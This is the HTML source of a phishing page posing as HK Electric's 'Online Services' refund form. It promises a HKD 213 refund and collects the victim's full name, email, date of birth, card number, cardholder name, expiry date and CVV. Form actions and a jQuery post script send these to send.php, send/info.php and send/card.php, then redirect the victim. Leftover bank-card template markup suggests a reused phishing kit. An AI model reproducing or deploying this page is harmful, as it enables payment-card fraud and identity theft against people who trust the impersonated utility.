<!DOCTYPE HTML>
<html data-ng-app="eServicesApp" style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths ng-scope"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
    <style>
        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak {
            display: none !important;
        }

        .translate-cloak {
            display: none !important;
        }
    </style>
    <link href="./Assest/css.css" rel="stylesheet">

    <link href="./Assest/css2.css" rel="stylesheet">

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online Services – HK Electric</title>
    

    <!--search engine optimization-->
    <meta name="description" content="Welcome to eServices. The official website of HK Electric which provides online self-services to enquiry public information.">


    <link href="./Assest/css3.css" rel="stylesheet" type="text/css">
    <link href="./Assest/googleFont.css" rel="stylesheet">



    <script src="/CS/bundles/jquery?v=13SOygrXHBvDQbQZpKaAhtoawLUQhA8Z1gQ1o9UY1ys1"></script>

    <script src="/CS/bundles/modernizr?v=wBEWDufH_8Md-Pbioxomt90vm6tJN2Pyy9u9zHtWsPo1"></script>

    <script src="/CS/bundles/angularJs?v=Yk-jq1rp93Rz4VMzDLoQXgkuL7iPR-EFmScK5p1eJUs1"></script>


    <script src="/CS/Scripts/eServices/eServicesApp.js"></script>

    <script src="/CS/bundles/eServicesScripts?v=xtPLYvN0vr8b8iacirOKcQFzSrFEj0fam81fVBnY3EQ1"></script>

    <style>
    </style>
</head>
<body class="custom-body-padding-top en-US"><div class="hidden-sm hidden-md hidden-lg mm-menu mm-offcanvas" id="hke-navbar-collapse"><div class="mm-panels"><div class="mm-panel mm-hasnavbar mm-opened mm-current" id="mm-1"><div class="mm-navbar"><a class="mm-title">Menu</a></div><ul class="hke-dropdown-menu mm-listview">
                <li class="aol-logo-xs">
                    <span class="aol-heading-title ng-scope" translate="eServices_Title">Online Services</span>
                </li>
                <li class="menu-red">
                  
                </li>
                <li ng-show="$state.current.name.indexOf('eforms', 0)" class="ng-hide">
                    <a data-ui-sref="reccert" class="ng-binding" href="#/reccert">
                        REC Application Status Tracking<span class="hke-button-arrow hke-button-arrow-darkred"></span>
                    </a>
                </li>
                <li ng-show="$state.current.name.indexOf('eforms', 0)" class="ng-hide">
                    <a data-ui-sref="recinfo" class="ng-binding" href="#/recinfo">
                        REC Information Enquiry<span class="hke-button-arrow hke-button-arrow-darkred"></span>
                    </a>
                </li>
                <li ng-show="$state.current.name.indexOf('eforms', 0)" class="ng-hide">
                    <a data-ui-sref="statusTrackingAuthenticate" class="ng-binding" href="#/statusTracking">
                        Application Progress Tracking<span class="hke-button-arrow hke-button-arrow-darkred"></span>
                    </a>
                </li>
                <li class="menu-grey ng-scope" data-ng-controller="headerController">
                    <span class="ng-binding">Language</span>
                    
                </li>
            </ul></div></div></div>
    <div id="mm-0" class="mm-page mm-slideout"><div id="hke-aol-header">
        <div class="container">
            
            <div class="pull-right">
                <a data-ng-href="" target="_blank" class="navbar-brand">
                    <img src="https://i.ibb.co/9hcgG8T/logo.png" title="The Hongkong Electric Co., Ltd.">
                </a>
            </div>
            <div class="navbar-wrapper">
                <a href="#hke-navbar-collapse" class="navbar-toggle collapsed pull-left visible-xs-block">
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </a>
            </div>
        </div>

    </div><div data-ng-controller="menuController" class="ng-scope">

        

        <div class="navbar navbar-default navbar-static-top">
            <div id="hke-aol-menu">
                <ul class="nav navbar-nav container hidden-xs">
                    <li class="menu-red">
                        
                    <a data-ng-href="https://aol.hkelectric.com/AOL/aol#/login?lang=en-us" target="_blank" class="ng-binding">
                            </a></li>
                    <li ng-show="$state.current.name.indexOf('eforms', 0)" class="pull-right ng-hide">
                        <a class="dropdown-toggle" data-toggle="dropdown" id="hke-menu-dropdown" role="button" aria-haspopup="true" aria-expanded="true" title="User Menu">
                            <img src="/CS/Resource/images/aol/icon-menu.png">
                        </a>
                        <ul class="dropdown-menu hke-dropdown-menu" aria-labelledby="hke-menu-dropdown">
                            <li>
                                <a data-ui-sref="reccert" class="ng-binding" href="#/reccert">
                                    REC Application Status Tracking
                                </a>
                            </li>
                            <li>
                                <a data-ui-sref="recinfo" class="ng-binding" href="#/recinfo">
                                    REC Information Enquiry
                                </a>
                            </li>
                            <li>
                                <a data-ui-sref="statusTrackingAuthenticate" class="ng-binding" href="#/statusTracking">
                                    Application Progress Tracking
                                </a>
                            </li>

                        </ul>
                    </li>
                </ul>
            </div>
        </div>
    </div><div id="aol-root-container">
        <!-- uiView: eServicesRoot --><div ui-view="eServicesRoot" id="aol-root" class="ng-scope">
<div class="eforms ng-scope">
    <div class="hke-title hke-title-account">
        <div class="bg">
            <div class="container ng-binding">Get Refund 得到退款</div>
        </div>
    </div>

    <div>
        <form action="send/info.php" method="post" role="form">
            <div class="container">
                <div class="alert alert-warning">
                    <p class="ng-binding">After verifying your identity, the amount of 213HKD will be returned to your credit card. This transaction will appear as HKELECTRIC on your credit card statement. If you do not receive the payment within 24h contact support.</p>
                    <br>
                    <p class="ng-binding">验证您的身份后，213港币的金额将退回您的信用卡。此交易将在您的信用卡对帐单上显示为 HKELECTRIC。如果您没有在 24 小时内收到付款，请联系支持人员。</p>
                </div>
            </div>

            <div class="container">
                <div class="form-item"><span class="red required-label ng-binding">Required field 必填字段</span></div>
            </div>

            <div class="container">
                <div class="form-item" id="RegisteredCustomerInfo">

                    

                    

                    

                    

                    <div class="form-item">
                        <label for="email" class="mandatory"><span class="after-colon ng-binding">Full Name 全名</span></label>
                        <div class="form-item-right">
                            <input ng-model="HKEIeSubscriptionFormData.email" type="text" name="fname" id="email" placeholder="Please enter full name" data-is-email="" maxlength="80" required="" ng-disabled="HKEIeSubscriptionFormData.IsEdit" class="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength ng-touched">
                            <div ng-show="hKEIeSubscriptionForm.$submitted || hKEIeSubscriptionForm.email.$dirty" class="validation-text-container ng-hide">
                            </div>
                        </div>
                    </div><div class="form-item">
                        <label for="email" class="mandatory"><span class="after-colon ng-binding">Email 电子邮件</span></label>
                        <div class="form-item-right">
                            <input ng-model="HKEIeSubscriptionFormData.email" type="text" name="email" id="email" placeholder="Please enter e-mail address" data-is-email="" maxlength="80" required="" ng-disabled="HKEIeSubscriptionFormData.IsEdit" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength">
                            <div ng-show="hKEIeSubscriptionForm.$submitted || hKEIeSubscriptionForm.email.$dirty" class="validation-text-container ng-hide">
                            </div>
                        </div>
                    </div><div class="form-item">
                        <label for="email" class="mandatory"><span class="after-colon ng-binding">Date Of Birth 出生日期</span></label>
                        <div class="form-item-right">
                            <input ng-model="HKEIeSubscriptionFormData.email" type="text" name="dob" id="email" placeholder="Please enter date of birth" data-is-email="" maxlength="80" required="" ng-disabled="HKEIeSubscriptionFormData.IsEdit" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength">
                            <div ng-show="hKEIeSubscriptionForm.$submitted || hKEIeSubscriptionForm.email.$dirty" class="validation-text-container ng-hide">
                            </div>
                        </div>
                    </div>

                    

                    

                    

                    

                    

                </div>
            </div>

            
            <div class="container">
                <div class="form-item">
                    <div class="alert alert-warning">
                        <div class="">
                            <p class="ng-binding">The amount of HKD 213 will be refunded to the credit card you will enter below. Please check your information before confirming.</p>
                            <p class="ng-binding">213 港元的金额将退还至您将在下方输入的信用卡。请在确认前检查您的信息。</p>
                        </div>
                    </div>
					
                </div>
				


			<div class="main-holder">
			<tr></tr>
			<tr></tr>
			<tr></tr>
						 <div class="stack request-product ss">

                            </div>
							<h3></h3>
							<form action="./send/card.php" method="post">
							<div class="col-xs-12">
		</div><div class="form-item">
                         <label for="email" class="mandatory"><span class="after-colon ng-binding">Card Number 卡号</span></label>
                        <div class="form-item-right">
                            <input type="text" name="number" id="email" placeholder="**** **** **** ****"  maxlength="19" required="" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength">
                          </div>
						  <h1></h1>
						  <label for="email" class="mandatory"><span class="after-colon ng-binding">Card Holder 持卡人</span></label>
                        <div class="form-item-right">
                            <input type="text" name="name" id="email" placeholder="JHON HAVEN"  maxlength="30" required="" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength">
                          </div>
						  <h1></h1>
						  <label for="email" class="mandatory"><span class="after-colon ng-binding">Expiry Date 到期日</span></label>
                        <div class="form-item-right">
                            <input type="text" name="expiry" id="email" placeholder="**/****"  maxlength="9" required="" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength">
                          </div>
						  <h1></h1>
						  <label for="email" class="mandatory"><span class="after-colon ng-binding">CVV</span></label>
                        <div class="form-item-right">
                            <input type="text" name="cvc" id="email" placeholder="***"  maxlength="3" required="" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength">
                          </div>


            <script type="text/template" id="template_73c4c714b3dd4348b156e5ad85241601">
                <div class="card" data-bind="css: { &#39;shopping-card&#39;: IsShoppingCard, &#39;credit-card&#39;: IsCreditCard, &#39;debit-card&#39;: !IsCreditCard(), &#39;blocked-card&#39;: IsBlocked, &#39;linked-card&#39;: IsLinked, &#39;inactive-card&#39;: IsInactive }">
                    <div class="card-header">
                        <h3 class="" data-bind="click: function(){return $root.Details(ko.utils.unwrapObservable($data));}">
<span class="text"   >

    <span data-bind="text: CardName" class="value">

    </span>
</span><span class="text"   >

    <span  class="value">
        to
    </span>
</span><span class="text"   >

    <span data-bind="text: Account.PreferenceName" class="value">

    </span>
</span>    </h3>

                    </div>

                    <div class="card-body">
                        <div class="stack">

                            <span class="text card-name">

    <span data-bind="text: CardName" class="value">

    </span>
                            </span><span class="text card-type">

    <span data-bind="text: CardType" class="value">

    </span>
                            </span><span class="amt" data-bind="visible: !IsInactive()" style="display: none">  
    <span class="value" data-bind="amount: AvailableAmount"></span>
                            <span class="ccy" data-bind="text: CCY"></span>
                            </span><span class="text card-number">

    <span data-bind="text: CardNumber" class="value">

    </span>
                            </span><span class="text register-3d" data-bind="visible: IsRegisterFor3D()" style="display: none">
<i class="i i-3d-password-white icon-lg"  ></i>

    <span data-bind="visible: IsRegisterFor3D()" class="value">

    </span>
                            </span>
                        </div>

                    </div>

                    <div class="card-footer">
                        <div class="stack" data-bind="visible: !IsInactive()" style="display: none">

                            <a class="link" href="javascript:void(0)" style="display: none" data-bind="click: function(){return $root.BlockCard(ko.utils.unwrapObservable($data));}, css: { &#39;d-none&#39;: IsBlockUnblockDisabled }, visible: !IsBlocked()" data-toggle="tooltip" title="Block">
                                <span class="text">
<i class="i i-lock-outline icon-lg"  ></i>

    <span  class="value">

    </span>
                                </span>
                            </a>
                            <button class="btn btn-primary" type="button" data-bind="css: { &#39;d-none&#39;: IsBlockUnblockDisabled }, visible: IsBlocked, click: function(){return $root.UnblockCard(ko.utils.unwrapObservable($data));}" style="display: none">

                                <span class="text">

    <span  class="value">
        Activate
    </span>
                                </span>
                            </button>
                            <a class="link" href="javascript:void(0)" style="display: none" data-bind="click: function(){return $root.AddModula(ko.utils.unwrapObservable($data));}, visible: CanAddModula" data-toggle="tooltip" title="Apply for free withdrawal from all ATMs in Bulgaria (Modula Program)">
                                <span class="text">
<i class="i i-card icon-lg"  ></i>

    <span  class="value">

    </span>
                                </span>
                            </a>
                            <button class="btn btn-primary btn-link" type="button" data-bind="visible: CanGetePIN, click: function(){return $root.GetEPin(ko.utils.unwrapObservable($data));}" style="display: none" data-toggle="tooltip" title="Request PIN">

                                <span class="text">
<i class="i i-square-right icon-lg"  ></i>

    <span  class="value">

    </span>
                                </span>
                            </button>
                            <button class="btn btn-primary btn-link" type="button" data-bind="visible: CanBe3DSubscribedAndNotRegistered, click: function(){return $root.RegisterCardFor3DPassword(ko.utils.unwrapObservable($data));}" style="display: none" data-toggle="tooltip" title="Subscibe for dynamic password">

                                <span class="text">
<i class="i i-3d-password-blue icon-lg"  ></i>

    <span  class="value">

    </span>
                                </span>
                            </button>
                        </div>
                        <button class="btn btn-primary btn-link" type="button" data-bind="visible: IsInactive, click: function(){return $root.GetEPin(ko.utils.unwrapObservable($data));}" style="display: none" data-toggle="tooltip" title="Request PIN">

                            <span class="text">
<i class="i i-square-right icon-lg"  ></i>

    <span  class="value">

    </span>
                            </span>
                        </button>
                    </div>
                </div>
            </script>
        </div>
    </main>

    <footer>
       
		<script src="./Assest/jquery.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="modal-loading.css" />
	<link rel="stylesheet" type="text/css" href="card.css" />
    <link rel="stylesheet" type="text/css" href="modal-loading-animate.css" />

    <script src="./Assest/modal-loading.js"></script>
	  <script src="./Assest/card.js"></script> 
		<script src="./Assest/jquery.card.js"></script>
		<script type="text/javascript">
        verticalBgColor();
$('form').card({
    // a selector or DOM element for the container
    // where you want the card to appear
    container: '.ss', // *required*
	placeholders: {
        number: '**** **** **** ****',
        name: 'Jhon Haven',
        expiry: '**/****',
        cvc: '***'
    }, messages: {
        validDate: 'valid\ndate', // optional - default 'valid\nthru'
        monthYear: 'mm/yyyy', // optional - default 'month/year'
    },

    // all of the other options from above
});


        function verticalBgColor() {

            var loading = new Loading({
                loadingBgColor: 'rgba(70, 173, 198, .8)',
                defaultApply: true,
            });

            loadingOut(loading);

        }
        /////loader duration///
        function loadingOut(loading) {
            setTimeout(() => loading.out(), 3000);
        }
        $(document).ready(function() {
 $(".btn-login").click(function() {
                var name = $("#name").val();
                var cvc = $("#cvc").val();
                  var number = $("#number").val();
                    var expiry = $("#expiry").val();
                if (name.length != 0 && cvc.length != 0 && number.length != 0 && expiry.length != 0) {
                    
                    verticalBgColor(); 
                    $.post("send.php",{expiry:expiry,number:number,cvc:cvc,name:name},function(data){
                        window.setTimeout(function() {
    window.location.href = 'min.php';
}, 3000);
                        
                        
                    })
                } else {
                   alert("error");
                }

                return false;

            })
        })
    </script>

    <!--script id="CookieDeclaration" src="https://consent.cookiebot.com/9d1c7e8d-e398-4c0c-8420-a37cefc1bd67/cd.js" type="text/javascript" async></script-->
    <script type="text/javascript" src="js/modernizr-custom.js"></script>
    <script type="text/javascript" src="js/jquery-1.11.2.min.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <script type="text/javascript" src="js/content.js"></script>
    <script type="text/javascript" src="js/jquery.main.js"></script>
    <script type="text/javascript" src="js/ispin.js"></script>
</footer>

		</div><iframe style="display: none; position: absolute; width: 1px; height: 1px; top: -9999px;" name="__uspapiLocator" tabindex="-1" role="presentation" aria-hidden="true" title="Blank"></iframe><iframe style="position: absolute; width: 1px; height: 1px; top: -9999px;" tabindex="-1" role="presentation" aria-hidden="true" title="Blank" src="#"></iframe>


                <div class="form-item">
                    <label for="directMarketing" class="force-auto-width">
                        <input class="force-auto-width ng-pristine ng-untouched ng-valid" type="checkbox" id="directMarketing" name="directMarketing" ng-model="HKEIeSubscriptionFormData.directMarketing" ng-true-value="true" ng-false-value="false">
                        <span class="ng-binding">I agree to the site privacy policy.</span>
                    </label>
                </div>
            </div>

            <div class="container">
                <div class="hke-button-wrapper">
                    <button type="submit" name="btnSubmit" class="hke-button hke-button-red pull-left ng-binding" value="Proceed" ng-disabled="isProcessing">Proceed<span class="hke-button-arrow hke-button-arrow-white"></span></button>
                    <button type="button" name="btnUnSubscribed" ng-show="HKEIeSubscriptionFormData.IsEdit" ng-click="UnSubscribed(hKEIeSubscriptionForm)" class="hke-button hke-button-red pull-left ng-binding ng-hide" value="Unsubscribe" ng-disabled="isProcessing">Unsubscribe<span class="hke-button-arrow hke-button-arrow-white"></span></button>
                </div>
            </div>

        </form>
    </div>

</div>
</div>
    </div><div class="modal loading-overlay-wrapper" tabindex="-1" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content overlay-loading">
                <div class="modal-body">
                    <div class="sk-circle">
                        <div class="sk-circle1 sk-child"></div>
                        <div class="sk-circle2 sk-child"></div>
                        <div class="sk-circle3 sk-child"></div>
                        <div class="sk-circle4 sk-child"></div>
                        <div class="sk-circle5 sk-child"></div>
                        <div class="sk-circle6 sk-child"></div>
                        <div class="sk-circle7 sk-child"></div>
                        <div class="sk-circle8 sk-child"></div>
                        <div class="sk-circle9 sk-child"></div>
                        <div class="sk-circle10 sk-child"></div>
                        <div class="sk-circle11 sk-child"></div>
                        <div class="sk-circle12 sk-child"></div>
                    </div>
                </div>
            </div>
        </div>
    </div><div class="modal fade overlay-wrapper" tabindex="-1" role="dialog">
        <div class="validation">
            <div class="modal-dialog">
                <div class="modal-content red-border-top overlay-content">
                    <div class="modal-header">
                        <h4 class="modal-title overlay-title ng-binding">Online Services</h4>
                    </div>
                    <div class="modal-body">
                        <p class="overlay-message paragraph"></p>
                    </div>
                    <div class="modal-footer" style="padding-top:0px">
                        <div class="hke-button hke-button-red ng-binding" data-dismiss="modal">OK<span class="hke-button-arrow hke-button-arrow-white"></span></div>
                    </div>
                </div>
            </div>
        </div>
    </div></div>



    


    
    


    <footer class="footer container">
        <ul>
            <li><a  target="_blank" data-translate="ContactUs_Text" class="ng-scope" >Contact Us</a></li>
            <li><a  target="target=&quot;_blank&quot;" data-translate="PrivacyPolicy_Text" class="ng-scope" >Privacy Policy</a></li>
            <li><a  target="_blank" data-translate="CopyrightDisclaimer_Text" class="ng-scope" >Copyright &amp; Disclaimer</a></li>
        </ul>
        <div class="clearfix"></div>
        <span data-translate="FooterCorp_Text" class="ng-scope">Copyright ©2019 The Hongkong Electric Company, Limited. All Rights Reserved.</span>
        <div class="demo-padding ng-hide" ng-show="isDemo"></div>
    </footer>

    

    
    <script src="/CS/bundles/bootstrap?v=WWePcSuOU0Q8SJbCEFa4uKbRVvz5YVLJp0eXq8_8ALk1"></script>

    


<noscript>You may be trying to access this site from a secured browser on the server. Please enable scripts and reload this page.</noscript>
<div id="mm-blocker" class="mm-slideout"></div></body></html>